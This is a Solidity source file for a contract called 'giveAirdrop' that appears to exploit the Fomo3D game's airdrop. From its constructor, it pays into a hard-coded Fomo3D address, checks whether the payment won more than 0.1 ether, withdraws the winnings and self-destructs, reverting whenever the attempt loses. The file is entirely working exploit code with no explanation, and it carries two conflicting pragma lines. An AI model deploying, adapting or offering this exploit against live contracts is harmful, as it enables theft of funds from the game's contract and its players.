pragma solidity ^0.4.6;
pragma solidity ^0.4.24;

contract giveAirdrop {

    constructor () public payable {
        
        fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
        
        
        require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
        
        
        (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
        require(winnings > 0.1 ether);
        fomo.withdraw();
        
        selfdestruct(msg.sender);
    }
    
    
    function () public payable {}
}
